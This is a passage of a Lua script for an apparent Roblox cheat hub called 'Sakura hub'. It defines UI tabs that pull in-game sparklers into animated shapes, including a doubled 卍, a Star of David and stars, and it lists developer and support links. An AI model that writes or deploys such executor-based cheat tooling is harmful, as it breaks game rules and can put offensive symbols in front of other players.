                            local pos1 = GetHalfManji(step1, size)
                            p1.CFrame = CFrame.new(centerPos + pos1, centerPos + pos1 + Vector3.new(0, 1, 0))
                            p1.AssemblyLinearVelocity = Vector3.zero
                        end
                        local p2 = sparklers[2]
                        if p2 and p2.Parent then
                            local pos2 = GetHalfManjiRotated(step2, size)
                            p2.CFrame = CFrame.new(centerPos + pos2, centerPos + pos2 + Vector3.new(0, 1, 0))
                            p2.AssemblyLinearVelocity = Vector3.zero
                        end
                    end
                end
                task.wait()
            end
        end)
    end

    local function StopManjiLoop()
        isRunning = false
        if loopTask then task.cancel(loopTask); loopTask = nil end
        OrionLib:MakeNotification({ Name = "卍", Content = "Stopped", Time = 2 })
    end

    ManjiTab:AddToggle({
        Name = "🔄 卍 (Both directions)",
        Default = false,
        Callback = function(Value)
            if Value then StartManjiLoop() else StopManjiLoop() end
        end
    })

    ManjiTab:AddSection({ Name = "Settings" })
    ManjiTab:AddSlider({ Name = "Manji Size", Min = 1, Max = 10, Default = 3, Color = _G.Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) size = v end })
    ManjiTab:AddSlider({ Name = "Drawing Speed", Min = 5, Max = 300, Default = 30, Color = _G.Theme.SliderColor, Increment = 5, ValueName = "speed", Callback = function(v) speed = v / 100 end })

    ManjiTab:AddButton({
        Name = "Rescan Sparklers",
        Callback = function()
            PlayActionSound()
            sparklers = GetSparklers()
            OrionLib:MakeNotification({ Name = "Rescan", Content = string.format("Detected %d sparklers", #sparklers), Time = 2 })
        end
    })

    ManjiTab:AddParagraph("How to Use", 
        "1. Place at least 2 FireworkSparklers\n" ..
        "2. Toggle ON to draw 卍\n" ..
        "3. Size and speed are adjustable"
    )
end

-- ============================================================================
-- Block 50: Sphere ◯ Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local SphereTab = Window:MakeTab({ Name = "Sphere ◯", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    SphereTab:AddToggle({ Name = "Activate Sphere", Default = false, Callback = _G.toggleSphere })
    SphereTab:AddToggle({ Name = "Follow Player", Default = SH.SphereConfig.FollowPlayer, Callback = function(v) SH.SphereConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    SphereTab:AddSlider({ Name = "Sphere Radius", Min = 2, Max = 50, Default = SH.SphereConfig.Radius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.SphereConfig.Radius = v end })
    SphereTab:AddSlider({ Name = "Latitude Lines", Min = 2, Max = 16, Default = SH.SphereConfig.Latitudes, Color = Theme.SliderColor, Increment = 1, ValueName = "lines", Callback = function(v) SH.SphereConfig.Latitudes = v end })
    SphereTab:AddSlider({ Name = "Longitude Lines", Min = 4, Max = 24, Default = SH.SphereConfig.Longitudes, Color = Theme.SliderColor, Increment = 2, ValueName = "lines", Callback = function(v) SH.SphereConfig.Longitudes = v end })
    SphereTab:AddSlider({ Name = "Object Count", Min = 8, Max = 100, Default = SH.SphereConfig.ObjectCount, Color = Theme.SliderColor, Increment = 4, ValueName = "pc", Callback = function(v) SH.SphereConfig.ObjectCount = v end })
    SphereTab:AddSlider({ Name = "Horizontal Rotation Speed", Min = 0, Max = 10, Default = SH.SphereConfig.HorizontalRotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.SphereConfig.HorizontalRotationSpeed = v end })
    SphereTab:AddSlider({ Name = "Vertical Rotation Speed", Min = 0, Max = 10, Default = SH.SphereConfig.VerticalRotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.SphereConfig.VerticalRotationSpeed = v end })
    SphereTab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = 10, Default = SH.SphereConfig.PulseSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.SphereConfig.PulseSpeed = v end })
    SphereTab:AddSlider({ Name = "Pulse Amplitude", Min = 0, Max = 5, Default = SH.SphereConfig.PulseAmplitude, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.SphereConfig.PulseAmplitude = v end })
end

-- ============================================================================
-- Block 51: Star of David ✡ Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local StarOfDavidTab = Window:MakeTab({ Name = "Star of David ✡", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    StarOfDavidTab:AddToggle({ Name = "Activate Star of David", Default = false, Callback = _G.toggleStarOfDavid })
    StarOfDavidTab:AddToggle({ Name = "Follow Player", Default = SH.StarOfDavidConfig.FollowPlayer, Callback = function(v) SH.StarOfDavidConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    StarOfDavidTab:AddSlider({ Name = "Star Size", Min = 2, Max = 50, Default = SH.StarOfDavidConfig.Size, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.StarOfDavidConfig.Size = v end })
    StarOfDavidTab:AddSlider({ Name = "Base Height", Min = 0, Max = 50, Default = SH.StarOfDavidConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.StarOfDavidConfig.Height = v end })
    StarOfDavidTab:AddSlider({ Name = "Triangle Height", Min = 0, Max = 20, Default = SH.StarOfDavidConfig.TriangleHeight, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.StarOfDavidConfig.TriangleHeight = v end })
    StarOfDavidTab:AddSlider({ Name = "Object Count", Min = 6, Max = 100, Default = SH.StarOfDavidConfig.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.StarOfDavidConfig.ObjectCount = v end })
    StarOfDavidTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 10, Default = SH.StarOfDavidConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.StarOfDavidConfig.RotationSpeed = v end })
    StarOfDavidTab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = 10, Default = SH.StarOfDavidConfig.PulseSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.StarOfDavidConfig.PulseSpeed = v end })
end

-- ============================================================================
-- Block 52: Star ★ Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local StarTab = Window:MakeTab({ Name = "Star ★", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    StarTab:AddToggle({ Name = "Activate Star", Default = false, Callback = _G.toggleStar })
    StarTab:AddToggle({ Name = "Follow Player", Default = SH.StarConfig.FollowPlayer, Callback = function(v) SH.StarConfig.FollowPlayer = v; if v then PlayActionSound() end end })
    StarTab:AddSlider({ Name = "Outer Radius", Min = 2, Max = 50, Default = SH.StarConfig.OuterRadius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.StarConfig.OuterRadius = v end })
    StarTab:AddSlider({ Name = "Inner Radius", Min = 1, Max = 30, Default = SH.StarConfig.InnerRadius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.StarConfig.InnerRadius = v end })
    StarTab:AddSlider({ Name = "Base Height", Min = 0, Max = 50, Default = SH.StarConfig.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.StarConfig.Height = v end })
    StarTab:AddSlider({ Name = "Object Count", Min = 5, Max = 100, Default = SH.StarConfig.ObjectCount, Color = Theme.SliderColor, Increment = 1, ValueName = "pc", Callback = function(v) SH.StarConfig.ObjectCount = v end })
    StarTab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 10, Default = SH.StarConfig.RotationSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.StarConfig.RotationSpeed = v end })
    StarTab:AddSlider({ Name = "Twinkle Speed", Min = 0, Max = 10, Default = SH.StarConfig.TwinkleSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.StarConfig.TwinkleSpeed = v end })
end

-- ============================================================================
-- Block 53: Star2 ✫ Tab
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local Star2Tab = Window:MakeTab({ Name = "Star2 ✫", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    Star2Tab:AddToggle({ Name = "Activate Star2", Default = false, Callback = _G.toggleStar2 })
    Star2Tab:AddToggle({ Name = "Follow Player", Default = SH.Star2Config.FollowPlayer, Callback = function(v) SH.Star2Config.FollowPlayer = v; if v then PlayActionSound() end end })
    Star2Tab:AddSlider({ Name = "Base Size", Min = 5, Max = 30, Default = SH.Star2Config.Size, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.Star2Config.Size = v end })
    Star2Tab:AddSlider({ Name = "Ray Length", Min = 1, Max = 10, Default = SH.Star2Config.RayLength, Color = Theme.SliderColor, Increment = 0.5, ValueName = "studs", Callback = function(v) SH.Star2Config.RayLength = v end })
    Star2Tab:AddSlider({ Name = "Base Height", Min = 5, Max = 50, Default = SH.Star2Config.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.Star2Config.Height = v end })
    Star2Tab:AddSlider({ Name = "Ray Count", Min = 6, Max = 36, Default = SH.Star2Config.RayCount, Color = Theme.SliderColor, Increment = 2, ValueName = "lines", Callback = function(v) SH.Star2Config.RayCount = v end })
    Star2Tab:AddSlider({ Name = "Object Count", Min = 12, Max = 100, Default = SH.Star2Config.ObjectCount, Color = Theme.SliderColor, Increment = 4, ValueName = "pc", Callback = function(v) SH.Star2Config.ObjectCount = v end })
    Star2Tab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 30, Default = SH.Star2Config.RotationSpeed, Color = Theme.SliderColor, Increment = 1, ValueName = "speed", Callback = function(v) SH.Star2Config.RotationSpeed = v end })
    Star2Tab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = 20, Default = SH.Star2Config.PulseSpeed, Color = Theme.SliderColor, Increment = 1, ValueName = "speed", Callback = function(v) SH.Star2Config.PulseSpeed = v end })
    Star2Tab:AddSlider({ Name = "Pulse Amplitude", Min = 0, Max = 10, Default = SH.Star2Config.PulseAmplitude, Color = Theme.SliderColor, Increment = 0.2, ValueName = "studs", Callback = function(v) SH.Star2Config.PulseAmplitude = v end })
    Star2Tab:AddSlider({ Name = "Jitter Speed", Min = 0, Max = 20, Default = SH.Star2Config.JitterSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.Star2Config.JitterSpeed = v end })
    Star2Tab:AddSlider({ Name = "Jitter Amount", Min = 0, Max = 10, Default = SH.Star2Config.JitterAmount, Color = Theme.SliderColor, Increment = 0.1, ValueName = "studs", Callback = function(v) SH.Star2Config.JitterAmount = v end })
end

-- ============================================================================
-- Block 54: N1, N2, N3 Tabs
-- ============================================================================
do
    local Window = _G.Window
    local SH = _G.SH
    local Theme = _G.Theme

    local AnimN1Tab = Window:MakeTab({ Name = "N1: Chaos Circle", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    AnimN1Tab:AddToggle({ Name = "Activate N1", Default = false, Callback = _G.toggleAnimN1 })
    AnimN1Tab:AddToggle({ Name = "Follow Player", Default = SH.AnimN1Config.FollowPlayer, Callback = function(v) SH.AnimN1Config.FollowPlayer = v; if v then PlayActionSound() end end })
    AnimN1Tab:AddSlider({ Name = "Radius", Min = 5, Max = 50, Default = SH.AnimN1Config.Radius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.AnimN1Config.Radius = v end })
    AnimN1Tab:AddSlider({ Name = "Base Height", Min = 0, Max = 50, Default = SH.AnimN1Config.Height, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.AnimN1Config.Height = v end })
    AnimN1Tab:AddSlider({ Name = "Object Count", Min = 10, Max = 100, Default = SH.AnimN1Config.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.AnimN1Config.ObjectCount = v end })
    AnimN1Tab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 50, Default = SH.AnimN1Config.RotationSpeed, Color = Theme.SliderColor, Increment = 1, ValueName = "speed", Callback = function(v) SH.AnimN1Config.RotationSpeed = v end })
    AnimN1Tab:AddSlider({ Name = "Pulse Speed", Min = 0, Max = 20, Default = SH.AnimN1Config.PulseSpeed, Color = Theme.SliderColor, Increment = 0.5, ValueName = "speed", Callback = function(v) SH.AnimN1Config.PulseSpeed = v end })
    AnimN1Tab:AddSlider({ Name = "Pulse Amount", Min = 0, Max = 30, Default = SH.AnimN1Config.PulseAmount, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.AnimN1Config.PulseAmount = v end })

    local AnimN2Tab = Window:MakeTab({ Name = "N2: Tornado Spiral", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    AnimN2Tab:AddToggle({ Name = "Activate N2", Default = false, Callback = _G.toggleAnimN2 })
    AnimN2Tab:AddToggle({ Name = "Follow Player", Default = SH.AnimN2Config.FollowPlayer, Callback = function(v) SH.AnimN2Config.FollowPlayer = v; if v then PlayActionSound() end end })
    AnimN2Tab:AddSlider({ Name = "Radius", Min = 3, Max = 30, Default = SH.AnimN2Config.Radius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.AnimN2Config.Radius = v end })
    AnimN2Tab:AddSlider({ Name = "Max Height", Min = 10, Max = 100, Default = SH.AnimN2Config.TopHeight, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.AnimN2Config.TopHeight = v end })
    AnimN2Tab:AddSlider({ Name = "Object Count", Min = 10, Max = 100, Default = SH.AnimN2Config.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.AnimN2Config.ObjectCount = v end })
    AnimN2Tab:AddSlider({ Name = "Rotation Speed", Min = 0, Max = 50, Default = SH.AnimN2Config.RotationSpeed, Color = Theme.SliderColor, Increment = 1, ValueName = "speed", Callback = function(v) SH.AnimN2Config.RotationSpeed = v end })
    AnimN2Tab:AddSlider({ Name = "Rise Speed", Min = 0, Max = 10, Default = SH.AnimN2Config.RiseSpeed, Color = Theme.SliderColor, Increment = 0.2, ValueName = "speed", Callback = function(v) SH.AnimN2Config.RiseSpeed = v end })
    AnimN2Tab:AddSlider({ Name = "Chaos Factor", Min = 0, Max = 10, Default = SH.AnimN2Config.ChaosFactor, Color = Theme.SliderColor, Increment = 0.2, ValueName = "strength", Callback = function(v) SH.AnimN2Config.ChaosFactor = v end })

    local AnimN3Tab = Window:MakeTab({ Name = "N3: Hyper Explosion", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    AnimN3Tab:AddToggle({ Name = "Activate N3", Default = false, Callback = _G.toggleAnimN3 })
    AnimN3Tab:AddToggle({ Name = "Follow Player", Default = SH.AnimN3Config.FollowPlayer, Callback = function(v) SH.AnimN3Config.FollowPlayer = v; if v then PlayActionSound() end end })
    AnimN3Tab:AddSlider({ Name = "Explosion Radius", Min = 5, Max = 100, Default = SH.AnimN3Config.ExplosionRadius, Color = Theme.SliderColor, Increment = 1, ValueName = "studs", Callback = function(v) SH.AnimN3Config.ExplosionRadius = v end })
    AnimN3Tab:AddSlider({ Name = "Object Count", Min = 10, Max = 100, Default = SH.AnimN3Config.ObjectCount, Color = Theme.SliderColor, Increment = 2, ValueName = "pc", Callback = function(v) SH.AnimN3Config.ObjectCount = v end })
    AnimN3Tab:AddSlider({ Name = "Cycle Speed", Min = 0, Max = 5, Default = SH.AnimN3Config.CycleSpeed, Color = Theme.SliderColor, Increment = 0.1, ValueName = "speed", Callback = function(v) SH.AnimN3Config.CycleSpeed = v end })
    AnimN3Tab:AddSlider({ Name = "Randomness", Min = 0, Max = 20, Default = SH.AnimN3Config.Randomness, Color = Theme.SliderColor, Increment = 0.5, ValueName = "strength", Callback = function(v) SH.AnimN3Config.Randomness = v end })
end

-- ============================================================================
-- Block 55: Info & Support Tab (Developers List + Official Links)
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib

    local InfoTab = Window:MakeTab({ Name = "Info & Support", Icon = "rbxassetid://3362458", PremiumOnly = false })

    InfoTab:AddSection({ Name = "Details" })
    InfoTab:AddLabel("Version: V0.7.2.140")
    InfoTab:AddLabel("Development Group: 土星グループ")

    -- Developers List
    InfoTab:AddSection({ Name = "Developers List (Press button to copy URL)" })

    local developers = {
        { name = "akkii", url = "https://saturngroup02.github.io/.akkiiProfile/" },
        { name = "yuzu", url = "https://www.tiktok.com/@yuzkiiiii_?_r=1&_t=ZS-9803o3VdZfs" },
        { name = "Siro", url = "https://www.tiktok.com/@siroiekitai.ikuiku?_r=1&_t=ZS-98056f8S1lX" },
        { name = "雪見だいふくの空箱", url = "https://www.tiktok.com/@tsabuwbtcyf?_r=1&_t=ZS-9804U7vJSCN" },
        { name = "Grok", url = "https://www.tiktok.com/@grok_chickenhubowner?_r=1&_t=ZS-9804Vo4gGUJ" },
        { name = "Holon", url = "https://www.tiktok.com/@holoncalm?_r=1&_t=ZS-9804WWHIPH5" },
        { name = "にゅずぴー", url = "https://www.tiktok.com/@nyuzupi?_r=1&_t=ZS-9804atmJ8p5" },
        { name = "クロスケ", url = "https://www.tiktok.com/@kurosuke_zinnsei?_r=1&_t=ZS-9804mgREhQQ" },
        { name = "Kame", url = "https://www.tiktok.com/@kame.dev?_r=1&_t=ZS-9804p27AnFC" },
        { name = "BG_Hack", url = "https://www.tiktok.com/@logfeetst?_r=1&_t=ZS-9804uxBdDmS" },
        { name = "imosuke", url = "https://www.tiktok.com/@imosuke923" },
        { name = "きーち", url = "https://www.tiktok.com/@ki.chi582?lang=ja-JP" },
        { name = "ポザーs", url = "https://www.tiktok.com/@pozasss?lang=ja-JP" },
    }

    for _, dev in ipairs(developers) do
        InfoTab:AddButton({
            Name = "👤 " .. dev.name,
            Callback = function()
                PlayActionSound()
                pcall(function() setclipboard(dev.url) end)
                OrionLib:MakeNotification({
                    Name = "URL Copied",
                    Content = dev.name .. "'s URL copied to clipboard",
                    Time = 3
                })
            end
        })
    end

    -- Official Links
    InfoTab:AddSection({ Name = "Official Links (Press button to copy URL)" })

    local officialLinks = {
        { name = "Developer [Saturn Group] Official Site", url = "https://saturngroup02.github.io/Official-Pages/" },
        { name = "Sakurahub Official Site", url = "https://saturngroup02.github.io/SakuraHUB-HomePages/" },
        { name = "Sakurahub Related Repo 1 (Sakura-Hub-main)", url = "https://github.com/SaturnGroup02/Sakura-Hub-main" },
        { name = "Sakurahub Related Repo 2 (Sakurahub-ja-en-vn-123-)", url = "https://github.com/SaturnGroup02/Sakurahub-ja-en-vn-123-" },
        { name = "Sakurahub Related Repo 3 (Sakurahub-SabuHUB)", url = "https://github.com/SaturnGroup02/Sakurahub-SabuHUB" },
        { name = "Sakurahub Related Repo 4 (Sakurahub-beta)", url = "https://github.com/SaturnGroup02/Sakurahub-beta/tree/main" },
    }

    for _, link in ipairs(officialLinks) do
        InfoTab:AddButton({
            Name = "🔗 " .. link.name,
            Callback = function()
                PlayActionSound()
                pcall(function() setclipboard(link.url) end)
                OrionLib:MakeNotification({
                    Name = "URL Copied",
                    Content = link.name .. "'s URL copied to clipboard",
                    Time = 3
                })
            end
        })
    end

    -- Support
    InfoTab:AddSection({ Name = "Support Server" })
    InfoTab:AddButton({
        Name = "Join Support Server [Discord Global]",
        Callback = function()
            PlayActionSound()
            setclipboard("https://discord.gg/qFQTe7rcyE")
            OrionLib:MakeNotification({ Name = "Link Copied", Content = "Copied to clipboard", Time = 2 })
        end
    })
    InfoTab:AddButton({
        Name = "Join Support Server [LINE Open Chat Japan Only]",
        Callback = function()
            PlayActionSound()
            setclipboard("https://line.me/ti/g2/-CBPty1N0v2XuNPqaJm5xLmCBt0wBr3_vxrOqQ?utm_source=invitation&utm_medium=link_copy&utm_campaign=default")
            OrionLib:MakeNotification({ Name = "Link Copied", Content = "Copied to clipboard", Time = 2 })
        end
    })
end

-- ============================================================================
-- Block 56: Completion Notification
-- ============================================================================
do
    local OrionLib = _G.OrionLib
    task.wait(1)
    PlayActionSound()
    OrionLib:MakeNotification({
        Name = "🌸さくらhubV0.7[EN]🌸 Launch Complete",
        Content = "v0.7.2.140",
        Image = "rbxassetid://4483362458",
        Time = 5
    })
    print("==========================================")
    print("🌸さくらhubV0.7[EN]🌸 v0.7.2.140EN")
    print("© 2026/10/1 開発チーム[土星グループさくらhub部門")
    print("==========================================")
end